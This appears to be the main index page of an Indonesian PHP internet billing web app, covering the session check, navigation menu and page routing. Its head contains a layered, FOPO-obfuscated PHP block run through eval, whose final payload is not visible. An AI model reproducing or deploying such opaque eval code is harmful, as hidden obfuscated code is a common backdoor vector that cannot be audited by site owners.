<!-- 
************************************************
* Developer    : Hades
* Company      : Wong Ndeso
* Release Date : 1 Agustus 2016
* Website      : www.wongndeso.net
* E-mail       : rickyfirman2411@gmail.com
* Phone        : 083-863-676-540
-->
<?php
  // error_reporting(0);
  session_start();  
  include "inc/config.php";
  
  
  $perusahaan = mysql_query("SELECT * FROM t_setting limit 1") or die (mysql_error());
  $seting =mysql_fetch_array($perusahaan);    
  $_SESSION['level'];
  if(empty($_SESSION['username'])){
  header("location:login.php");
}else{
?>


<html>
<head>
  <?php
/*
Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/
This code was created on Friday, October 13th, 2017 at 15:01 UTC from IP 36.78.46.120
Checksum: b187c2a076baf0401dcd6d5bd4e0d7a71dc6af3f
*/
$kc9173cc="\x62\x61\x73\145\66\64\x5f\x64\145\143\x6f\x64\145";@eval($kc9173cc(
"Ly9OS3RPdS83UW1XZWUyVEhnVE5XemRXRG1tQlZMUlNFZnJrV0JFcUlQODY4UFRJOVhkN2VFR3Mrcn
E5ajhnb1RNMlYvVWcvWEI5OFlxZzFBV1hRdnFaQStVeGRxVFMxeHVvRHpad1M1RHFNVEUzUU5Oakw0Y
i9QZVR3Vks0SHZQU0F6V2dDRktzSEtmN0tTUmNKOE5qbk54VzlCekxkRUFUVHEvZlAwRFR1KzZza0Z5
MnhJcGZwcDVoQldSeFBITnZjSWtaOU95ajlRTTd5UjNxTC8xajhMQ1ZiblJJNVhoNUdmWW1zVS9uaWF
kcDA1SW9pSDNreWZ3UFFjbHZ2ZXg5ZWRvUCtaYnE5OXY4dWZWUWJudGhCQ3UwYkUxa29SSG9Hak1KYT
lIMUozaHlNZkVib0hQdGlRMERGOEpSK0N4M2VmeFRhNzNQQkEvWU9FMW5WdWtSUnEybFgrSFdPa0dJe
Vh0TUtwU3Z6RVdYbkRUVThVLzl3cmt5ZUFRQVhVUmZVQkNPTDJWMFFXYXpLRUR5bktVR1FOU0FPcUVJ
VXZpdDlCQkpaY2VocWRKUWs3ZWFocEk5dUsxSjJCYWhmc05WZlkra0VBUmtxY2VTZWFYN1RoVy9kZGh
6bjZWdktienpnSVYrbnVmanU2QTVjSXVsVStxcVRPV0owT1dsOjRrTWFpbWd3N2hnUU5OPT06cHBvND
BzbnEKJHMxNjdkNTMxPSJceDczIjskYzM1ZDIxNjk9Ilx4NjciOyRmMWRhOTBmND0iXDE2MCI7JG1kN
TcwZDc2PSJceDcyIjskbzQ4NDczNWY9Ilx4NzMiOyRrOGQ4MDEzZT0iXDE0NiI7JGtjOTE3M2NjPSJc
eDYyIjskaDFiOTMzMjU9Ilx4NzMiOyRoYjljZGY1NT0iXDE0NSI7JHMxNjdkNTMxLj0iXHg3NCI7JGM
zNWQyMTY5Lj0iXDE3MiI7JGYxZGE5MGY0Lj0iXDE2MiI7JGtjOTE3M2NjLj0iXDE0MSI7JGs4ZDgwMT
NlLj0iXDE1MSI7JG80ODQ3MzVmLj0iXDE2NCI7JG1kNTcwZDc2Lj0iXHg2NSI7JGhiOWNkZjU1Lj0iX
DE3MCI7JGgxYjkzMzI1Lj0iXHg2OCI7JG1kNTcwZDc2Lj0iXHg3MyI7JGYxZGE5MGY0Lj0iXHg2NSI7
JGtjOTE3M2NjLj0iXDE2MyI7JG80ODQ3MzVmLj0iXHg3MiI7JGMzNWQyMTY5Lj0iXHg2OSI7JGs4ZDg
wMTNlLj0iXDE1NCI7JHMxNjdkNTMxLj0iXHg3MiI7JGhiOWNkZjU1Lj0iXHg3MCI7JGgxYjkzMzI1Lj
0iXDE0MSI7JG80ODQ3MzVmLj0iXDE0MyI7JGhiOWNkZjU1Lj0iXHg2YyI7JGgxYjkzMzI1Lj0iXDYxI
jskZjFkYTkwZjQuPSJceDY3IjskbWQ1NzBkNzYuPSJceDY1Ijska2M5MTczY2MuPSJceDY1Ijskazhk
ODAxM2UuPSJceDY1IjskYzM1ZDIxNjkuPSJceDZlIjskczE2N2Q1MzEuPSJceDVmIjskbWQ1NzBkNzY
uPSJcMTY0IjskczE2N2Q1MzEuPSJcMTYyIjskYzM1ZDIxNjkuPSJceDY2IjskaGI5Y2RmNTUuPSJcMT
U3IjskazhkODAxM2UuPSJcMTM3IjskZjFkYTkwZjQuPSJcMTM3Ijska2M5MTczY2MuPSJceDM2Ijskb
zQ4NDczNWYuPSJceDZkIjskbzQ4NDczNWYuPSJceDcwIjskZjFkYTkwZjQuPSJceDcyIjska2M5MTcz
Y2MuPSJcNjQiOyRoYjljZGY1NS49Ilx4NjQiOyRjMzVkMjE2OS49IlwxNTQiOyRrOGQ4MDEzZS49Ilw
xNDciOyRzMTY3ZDUzMS49Ilx4NmYiOyRrOGQ4MDEzZS49IlwxNDUiOyRzMTY3ZDUzMS49Ilx4NzQiOy
RoYjljZGY1NS49IlwxNDUiOyRrYzkxNzNjYy49Ilx4NWYiOyRjMzVkMjE2OS49Ilx4NjEiOyRmMWRhO
TBmNC49IlwxNDUiOyRrYzkxNzNjYy49IlwxNDQiOyRjMzVkMjE2OS49IlwxNjQiOyRmMWRhOTBmNC49
IlwxNjAiOyRrOGQ4MDEzZS49IlwxNjQiOyRzMTY3ZDUzMS49Ilx4MzEiOyRrYzkxNzNjYy49IlwxNDU
iOyRzMTY3ZDUzMS49Ilx4MzMiOyRmMWRhOTBmNC49Ilx4NmMiOyRrOGQ4MDEzZS49IlwxMzciOyRjMz
VkMjE2OS49Ilx4NjUiOyRrYzkxNzNjYy49IlwxNDMiOyRrOGQ4MDEzZS49IlwxNDMiOyRmMWRhOTBmN
C49Ilx4NjEiOyRmMWRhOTBmNC49IlwxNDMiOyRrYzkxNzNjYy49Ilx4NmYiOyRrOGQ4MDEzZS49Ilx4
NmYiOyRrOGQ4MDEzZS49Ilx4NmUiOyRmMWRhOTBmNC49IlwxNDUiOyRrYzkxNzNjYy49Ilx4NjQiOyR
rOGQ4MDEzZS49IlwxNjQiOyRrYzkxNzNjYy49Ilx4NjUiOyRrOGQ4MDEzZS49IlwxNDUiOyRrOGQ4MD
EzZS49IlwxNTYiOyRrOGQ4MDEzZS49IlwxNjQiOyRrOGQ4MDEzZS49IlwxNjMiOyRuOTI3NGQ1Mz0ka
GI5Y2RmNTUoIlw1MCIsX19GSUxFX18pO0BldmFsKCRvNDg0NzM1ZigkaDFiOTMzMjUoJGYxZGE5MGY0
KCJceDJmXHg1Y1x4MjhceDVjXDQyXHgyZVx4MmFcMTM0XDQyXDEzNFw1MVx4MmYiLCJcNTBceDIyXDQ
yXDUxIiwkZjFkYTkwZjQoIlx4MmZceGRceDdjXDEyXDU3IiwiIiwkazhkODAxM2UoJG1kNTcwZDc2KC
RuOTI3NGQ1MykpKSkpLCJcMTQzXHgzMFw3MFx4MzhcNjFcNjNcNjBceDM2XHg2NFx4MzFcNjVceDYzX
HgzNFw2NFwxNDZceDYxXHgzOFw2M1x4MzhceDY2XHgzN1wxNDVceDYzXDY0XDY0XHgzOFw2MVx4MzZc
NjNceDMyXDY0XDE0Mlx4MzlcNzFcNjJcNjdceDMzXHg2Mlx4MzNcNjIiKT8kYzM1ZDIxNjkoJGtjOTE
3M2NjKCRzMTY3ZDUzMSgiQ0lHTWVkWjZTaTJLYjNkYkl1Nkx3TlRJZWdFTnpCcE5WblFtandqVFBWR2
s2bWdJZUloSllUZkNubDNvMmFpL25TWlRiNHQwL3JzZVRqQzQ5ajZrb2pqRmE1Qzh1aU83VzhOM0V5U
HNSQ3d3anRRa3dNUy83bjlzQzFYUG1VTlpaYS9qYWpRMXo0QzU3Q2t3ajA4bCtaQjVILzhQTXRrRlRI
eXRpalJzVkRrK1NQUStza0s0VDFtODhyM1JPMERESzcvK3o2OWs5L0JpbWY4cy85NzQ1MStkYTErOFZ
peTVKcTVpc1hxTTdMSFQ5OWdiU0NyemZQSzNzZmd4WTVXQW1JdnJtL2JXd2pTaUZQTThmTGVsemRzSV
RRUWdNY2NNelhHWkdXVUx3SnVaczBQZ0FGTW9EWUhvVHFEK1ZKS0syckFjMXVFbmx0RHV5TnpSaEl3V
FZnam9yNi93a1dEdTgrY2xwVmhwQlhjd3pvRWFFV3ZzUHQyTGc3eXJ5SWg3dEpPclFiVW01Y0hhcG9q
LytWUXl4SDVMalo1ZjJ4TXBXWU1zUkxHRkZYRHYrVk1TeFNycUsxZFNDeXU5NzdQWXg2aVpXZ3FYVnN
FbjM3Z3hFUHpJd3pNNXVXTVdOTnpKMDZiNTVhUmtqcTlJbG5ya2lQMzZmMytqTFMveVRZNk1NbmZHYS
t4SFZScmR5QlZ2MzN5bHlHcFRSdDU4aTNWd3orSmhUbTVITG9TbXcyNk9WQVBFMStCd2d3UXJCc01MZ
21hRHA2dVJybTVoTjVOU0g3ZEJWb2s2QkZJWko5djhQdE1zSDdndldpRklUWDlTdGZiK09odUVLaExU
d2NldytYbGEyU3AyRFNUTXFhZGVLcC9TWklPQnpwL0VwMElFQmozVGc3VmtIc0Zsc2puK3VwQXhHcUp
LbjFyclQydU1pRUg5NTA5M2drbWhYc1F2dkcyN2Y4TjI2aTdaUXBodjRCaU1Mak1vdjlFTElNaENZek
w3SDFBbGFzUWVaai9DbTZnNlYwWjlBSG5BVjY1S1hLWGhZRHRLOTBsNjdxWWVsRGJ4enVmWTRXOW1YQ
UFaNlVJb3ZaSmxodjVFamxIcENFK2FyVUN5bGVZSU1DWjBmTDZtTW8zZWRna3EzMllnclpxTXViVHVT
b3psN2k2OVFuZ1NGc2lwRmNwZXYzcE9XNFBWMnhlZGhXWGJ3OG95ZnNPS0JrMGYvdVJOaEQ1WWRJalV
SemsyYjl0eCtmYjAvV1QyUm1HZG5rMkxYRkJIempGYmVCVFFWaENBZ2JCMys4STAxN1F0YU1WcVNSOE
UrNlhBVVdoWVdKOW1DU2liYUZDUzdBN2kwRll4R2FmenRYajZHUWNBUUdmdmhaT1dpSkNTTXVvNVlyR
VFBdXpuVmRrOGtHRGoydXdCSE5KS0dJSnl5K25uU1FBWGQ5Y3dyaGI0aGlwZmZGU0x3RmhMUjB6TTBR
eXprMW5tdjRURG80SGdsYXFud3JMdXNlcUZNRTNCcHpQOXIwaXpoMlIvWGhuRW5sZ3RFL2RocS80dVB
EZDVNcUdrWGJqR0h0aGk4L01jaEtwK29ORlRQeHdpS25WMGxIMWZHK3pDT21yOUh4dC90TFpLeS9WeE
hwQ1N6eG1tdmdvRE9GN1pRdmxqSHliWDhNTExjL0dxeWNJVlBIT1FPVmRiQkl3aEpuNkk4Wm9TU2pLZ
kJWK2FGZlBsRmNMOHNWK1lPVWsrbGdKSDR1TVZZSWFWVXZpa2d6TVFJN1RvNFlBUExXNWN5a2JKM0Fx
UElKZUxEUzdMQm00ektVZXpoQnlSdmlXZHIyVUxwYW5kMHBWWGJZMHNkVDlqa0VoZDBGS1NwcmVtOHF
MUUNYZEgzbnpJd3ZtV0dFcGFsaGRtSXlCU0xSUWNCMHRiRkgwcXRSTjBlVmNJWTVGVDdKdXdROW1iUS
tiVG1ydldVeUJvd2ZGZUpITW5QckpjM1dNWUR2bVRuZjF4UnFRK1pFakJYVUdFQy9LajJvZEpYaUNBS
VJhODJ0YnlaZGRoaXBiV2t5WW5jazdmOGFkTHVOdzE0WVBybjN4KzRhMHhJTWlwRnJGNHBqdlArS3Fo
NEk4bUJsRnNld045cXlhY3BDODBkdFo2V3d5SnRJMUVJcVZpdXpMZ0I5LzZjMXNFSlRhbm05a1dYcjh
WcWdFdjFja3RXelJFOUlQNEdIM0xqVGR1OFVSQ1BZb0JsSXpPVnh4ZTJkQ01ObSs3dzUyQ1dhbDhsNm
dqVG9vQzZVcHN3MHdwMEY2Q2c2R3FWREd0cnJnQmhVTGlCT2tXVndvRnRmWWNLc0xjM3U1eHNHM3dNY
1BXNThFVi9lZ092N3ZPeE1uZXlNNmhuZGgvNm1yWVY4cXJtaVZ5Zmc3bkR2WWhIakNQNjI2Ykk0Z0Nj
bm9hSjBNWkNvMHhUZlJNM2ljUWNCb1NSRXlvd0J0U0ZMUTV6UTJ3cEp3c3cvbWxGdWZ3djREMlUxTEx
wMStxRmZuOEkrTGxHaGVxZXpydzk5a3dQVmJ3aXN0K3JNYTVDWExFeHVvYnM3Nys4MXovL3RwPSIpKS
k6JGMzNWQyMTY5KCRrYzkxNzNjYygkczE2N2Q1MzEoIkNIN1NlaERUUkNsS2NtM2ZsdHBtbkVIY0xrb
VF6U2FpTHVqbTg5cWFJeGNsWFVKY1A3Yy9BUHhBeDJ2bi9pSzFRSkNWTy9OM0dYUXNXNFMvUjhHM3ZK
WXNaUmMrMWMrVzRFK3QzbU9Cc3pHZncrS2U5NDhIa0daUldodUMvdkQrTnV5L1FDUFU1azhEVS83VSt
Yc20zOFFzK0U2M0MvK0Mvc21rM2paL2lqbUN4QmdXeDN0UVBxbEZhZjZVblpoSkN6aE0vWjZKZjZic0
R0MlVER25ZVkxjaUptWEMvcXdsMGU3aG5HSFhVUVFjUnpwWE10ZFA2WXo2OGRKT1EwU0YzTWJ2Q0dpe
VBiWFN6blNUODRuem0va2szUVRMdGt0VDVSTGFGd24vcEFrWHBLYTFIaHdEbGZkZklhdnFJZlRkVlJI
SFpsMUdBdC9PWFFJR2YwVVRnRFFhck9MdjR1RW9PVVNHUE9EdExuYStSakY2RGZIa1JPTlp4V1hYdFF
tMEpmNWdBbEdvMDl1SmVSK1oyY3phL2JIVHFZdjlva2FhSG1FYmJEZWY1WHNIWm1PSXY5R1JlZW5KbF
BCZHcycVZrM3dzeWh6TUM2empNOHJGcWczSkpFRTQyQXc0VHV1L2FCMTRJaC93cGdrTnBsN2lQb2xMY
kpGZGlZQ2pWVVFQR0VlUW43ZndVVTQ5dUI0RW83ZGF4Ujk5RlB3bWlFMXR6TU1md0lUcjZ4RkxBZXN1
Z1lTaE5tWVUweGM5b3FJNGhlYWkvcWxGblVsdjlUVGo3QUZtU1VoWEo5MkxNSEZCUmpXWFJaVkFDRFp
iUWRUNUhIYnU1Zk5pTTBMQVlHR1F3NWVGbjFyQkthd2k4bnpCOHVlSzZiaFA4b1FVRkNSNUhhYzdVb0
EvNDhvQmd1Um84RDBtMlcxcW1HQ1ZqaDAwQVBmamJrbmNLdjRKWWQvM2lGeFNlMmh1MFk4aHdyWlZpQ
TI5OTV1SmVLMzM2SGIvcHRUc2RnaTE4M3d0QWZuK3ZaREkzZjlGbkVTZXgvUFNrWE9oTDlUem5xOE5x
MjUwZzFtM3BsMDBHMC8wbWRGQ25MTktsRHdZbW5nWE5PNXNSbDdDckMvbkh6QXF4VHRVNjNUMHVuUmd
DZnBiVzdaek80QzBUK2NBVjlVdUllZ3JjWWlSK3FNQmhuTmtoWkp6bUFUY2dReldMeUwwdE5heW1Fdn
p6cUtaalJQMjlYQ3lBNlNhZ0RDcThLWUFCdnJuSzR1M2p5UVJXRHR6Uks3WERnRjdncEhmOUpENUU1R
EpVRHowM0RnNkxRWnlGeGlJNEdqZXZTbVlhcHdFZUxZRWZpR1lBUWYvRGJRZTNuQUdZYzNZODlteDI0
MWlqQ0VIaGdhMTJNbDk1aGNLQ1l6ZytISXM3R3Y2azlvS0ZMUGtvZEVaSm9NRDJwdlRSZlphRUpnVmh
PeXdoeTVWNk5BekJrSHVMS0Z1NmtZWHgyN0drTTBZQmtMclZVNENIdjAyelprSkwzeEk4TmVkUkVsUE
VpR3VWK0hEZEpZcXdvM3Z3N04yaDNyNUF0eHQ4K0lJZTNrdDJFclBEUlRLQ3VjQlVJU0NDUnl2bm5nS
0dRaTJZWXZWcFNjcnN1WFhxcDBTSVBpaGtDSmpJcVVHWW9VaHNlZnZUL2JIcGpBeHBNUVNLYVZSMG1r
aVZrNFBHN2pjaDdsWmpicmZlUEt2Q0x6VzdpeXhNVzd1eStBNFdSUjlCQ3duanhidThENk9mYzFaM2w
zQStiN2lwM3R1N2xOcGU2WVVNUFV2WW1HNE1YbVlxYTBwWXF6b0V3T1J0V3ZEZ01aMXMxaDF1Mlhmdm
VqVUlPSlZsVW1sWmNIMklINkxRMVFXbXVOclc0dWdPMFAvcU8vMjV2bm14clViQlIwUVBSSjA3VEE1Q
0h3K01GSzd2dDhGb1FIS0RRS3ZiSmVobk5GcEo0MFRKc3NRWEhHSFV3RXpHQ1R2RXBQZDZpaERpOUhk
N3lGVHdRZXc5TjU4d3FkV3p5OTFJMTZ2K3pVdDR1VDRYUm8zcXpGajByZ0hUMUd4R09kZUcrZGRhdFM
yanZOV3RWMzY5cmlLZTkvL05OPT0iKSkpKTs="));
?>
  <link href="css/bootstrap.css" rel="stylesheet">
  <!-- DataTables -->
  <link rel="stylesheet" href="css/dataTables.bootstrap.css">    
  <link href="css/style.css" rel="stylesheet">  
  <link rel="stylesheet" href="js/jquery/jquery-ui.css"> 
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="js/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="js/bootstrap.min.js"></script>
    <!-- DataTables -->
    <script src="js/datatables/jquery.dataTables.min.js"></script>
    <script src="js/datatables/dataTables.bootstrap.min.js"></script>
    <!-- page script -->
    <script>
      $(function () {
        $("#example1").DataTable({
          "language": {
            "url": "js/datatables/Indonesian.json"
        }
        });

      });
    </script>
    <script src="js/angka.js"></script>
    <script src="js/jquery/jquery-ui.js"></script>
    <script src="js/jquery/jquery-ui.min.js"></script>
    <!--
    <link rel="stylesheet" href="http://code.jquery.com/ui/1.11.4/themes/smoothness/jquery-ui.css">
    <script src="http://code.jquery.com/jquery-1.10.2.js"></script>
    <script src="http://code.jquery.com/ui/1.11.4/jquery-ui.js"></script> -->
    
  <title>Aplikasi Tagihan Internet - Sorong IT Web</title>
  
  <script type="text/javascript" charset="utf-8">
  function fnHitung() {
  var angka = bersihPemisah(bersihPemisah(bersihPemisah(bersihPemisah(document.getElementById('inputku').value)))); //input ke dalam angka tanpa titik
  if (document.getElementById('inputku').value == "") {
    alert("Jangan Dikosongi");
    document.getElementById('inputku').focus();
    return false;
  }
  else
    if (angka >= 1) {
    alert("angka aslinya : "+angka);
    document.getElementById('inputku').focus();
    document.getElementById('inputku').value = tandaPemisahTitik(angka) ;
    return false; 
    }
  }
  </script>

  <script>
  $(function() {
    $( "#datepicker" ).datepicker({ dateFormat: 'yy-mm-dd' });
    
  });
  $(function() {
    $( "#tgl_validasi" ).datepicker({ dateFormat: 'yy-mm-dd' });
    
  });
  $(function() {
    $( "#dari" ).datepicker({ dateFormat: 'yy-mm-dd' });
    
  });
  $(function() {
    $( "#sampai" ).datepicker({ dateFormat: 'yy-mm-dd' });
    
  });

  // $("#harga").on("change", function(){
  //     var nilai = $("#harga :selected").attr("data-harga");
  //     $("#hasil").val(nilai);
  // });

  
    
  </script>
  
</head>
<body>
 
<div class="navbar navbar-inverse navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a href="./" style="padding: 19.5px 15px;" class="navbar-brand">Member Area</a>
          <button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
        </div>
        <div class="navbar-collapse collapse" id="navbar-main">
          <ul class="nav navbar-nav">
            <?php if($_SESSION['level'] == 'admin'){ ;?>
            <li class="dropdown">
              <a class="dropdown-toggle" data-toggle="dropdown" href="#" id="themes">Master Data <span class="caret"></span></a>
              <ul class="dropdown-menu" aria-labelledby="themes">            
                <li><a href="?page=paket">Data Paket</a></li>
                <li><a href="?page=pelanggan">Data Pelanggan</a></li>                
                
              </ul>
            </li>
            <li><a href="?page=cek_tagihan">Cek Tagihan</a></li>
            <?php }?>
            <li><a href="?page=tagihan">Tagihan</a></li>
            <li><a href="?page=transaksi">Pembayaran</a></li>
            <?php if($_SESSION['level'] == 'admin'){ ;?>
            <li class="dropdown">
              <a class="dropdown-toggle" data-toggle="dropdown" href="#" id="themes">Laporan <span class="caret"></span></a>
              <ul class="dropdown-menu" aria-labelledby="themes">
                <li><a href="?page=rekapbayar">Rekap Pembayaran</a></li>  
              </ul>
            </li>
            
            <li class="dropdown">
              <a class="dropdown-toggle" data-toggle="dropdown" href="#" id="themes">Pengaturan <span class="caret"></span></a>
              <ul class="dropdown-menu" aria-labelledby="themes">
                <li><a href="?page=admin">Manajemen Admin</a></li>                
                <li><a href="?page=user">Manajemen User</a></li>                
                <li><a href="?page=perusahaan">Profil Perusahaan</a></li>
              </ul>
            </li>
            <?php }?>
          </ul>

          <ul class="nav navbar-nav navbar-right">
            <li class="dropdown">
              <a class="dropdown-toggle" data-toggle="dropdown" href="#" title="<?php echo ucfirst($_SESSION['username'])  ;?>" id="download"><span class="glyphicon glyphicon-user" aria-hidden="true"></span> <?php echo ucfirst($_SESSION['username'])  ;?> <span class="caret"></span></a>
              <ul class="dropdown-menu" aria-labelledby="download">
              	<!--<li><a href="?page=profil">Profil</a></li>-->
                <li><a href="?page=logout">Logout</a></li>
              </ul>
            </li>
          </ul>

        </div>
      </div>
    </div>

<div id="wadah">

  <div id="kepala">
        <img src="img/<?php echo $seting['logo'] ?>" class="thumbnail span3" style="display: inline; float: left; margin-right: 20px; width: 100px; height: 100px">
        <h2 style="margin: 15px 0 10px 0; color: #000;"><?php echo $seting['nama'] ?></h2>
        <div style="color: #000; font-size: 16px; font-family: Tahoma" class="clearfix"><b>Alamat : <?php echo $seting['alamat'] ?></b></div>
         
  <!-- <img src="img/header.png" width="100%" height="30%"> -->
  </div>

  

  <div id="isi">

  <?php 
  $page = @$_GET['page'];
  $action = @$_GET['aksi'];
  if($page == "pelanggan"){
    if ($action == ""){
      include "view/l_pelanggan.php" ;
    }else if ($action == "tambah"){
      include "view/f_pelanggan.php" ;
    }else if ($action == "detail"){
      include "view/detail_pelanggan.php" ;
    }else if ($action == "edit"){
      include "view/u_pelanggan.php" ;
    }else if ($action == "delete"){
      include "view/l_pelanggan.php" ;
    }else {
    include "view/404.php";
  }
  }else if ($page == "tagihan"){
    if ($action == ""){
      include "view/l_tagihan.php" ;
    }else if ($action == "tambah"){
      include "view/f_tagihan.php" ;
    }else if ($action == "edit"){
      include "view/u_tagihan.php" ;
    } else if ($action == "delete"){
      include "view/l_tagihan.php" ;
    } else {
    include "view/404.php";
  }  
  }else if ($page == "transaksi"){
    if($action == ""){
      include "view/l_transaksi.php";
    }else if($action=="tambah"){
      include "view/f_transaksi.php";
    }else if($action=="edit"){
      include "view/u_transaksi.php";
    }else if($action=="delete"){
      include "view/l_transaksi.php";
    }else if($action=="detail"){
      include "view/detail_transaksi.php";
    }else {
    include "view/404.php";
    }    
  }else if ($page == "profil"){
    include "view/l_profil.php";
  }else if ($page == "perusahaan"){
    include "view/setting.php";
  }else if ($page == "admin"){
    if($action == ""){
    include "view/l_admin.php";
    }elseif ($action == "tambah") {
      include "view/f_admin.php";
    }elseif ($action == "edit") {
      include "view/u_admin.php";
    }elseif ($action == "delete") {
      include "view/l_admin.php";
    }else {
    include "view/404.php";
  }

  }else if ($page == "paket"){
    if ($action == ""){
      include "view/l_paket.php" ;
    }else if ($action == "tambah"){
      include "view/f_paket.php" ;
    }else if ($action == "edit"){
      include "view/u_paket.php" ;
    } else if ($action == "delete"){
      include "view/l_paket.php" ;
    } else {
    include "view/404.php";
  }  
  }else if ($page == "user"){
    if($action == ""){
    include "view/l_user.php";
    }elseif ($action == "tambah") {
      include "view/f_user.php";
    }elseif ($action == "edit") {
      include "view/u_user.php";
    }elseif ($action == "delete") {
      include "view/l_user.php";
    }else {
    include "view/404.php";
  }

  }else if ($page == "rekapbayar"){
    include "view/rekap_laporan.php";
  }else if ($page == "cek_tagihan"){
    include "view/cek_tagihan.php";
  }else if ($page == "logout"){
    include "logout.php";
  }else if ($page == ""){
    include "view/xyz.php" ;
  }else {
    include "view/404.php";
  }
  
  ?>
  </div>
  <div id="ekor">
	<footer class="site-footer">
		<center>
		Hak Cipta Terpelihara oleh ExotisNet
		<br>
		Jl. vihara No.19 02/05 Balerejo Wlingi Blitar<br>
Developed By <a href="https://www.facebook.com/virmansyah.ricky"><b>Fatkul Toriq</b><br>

		</center>
		</footer>
	</div>
   </div>
</div>
 
  
</html>
<?php
}

?>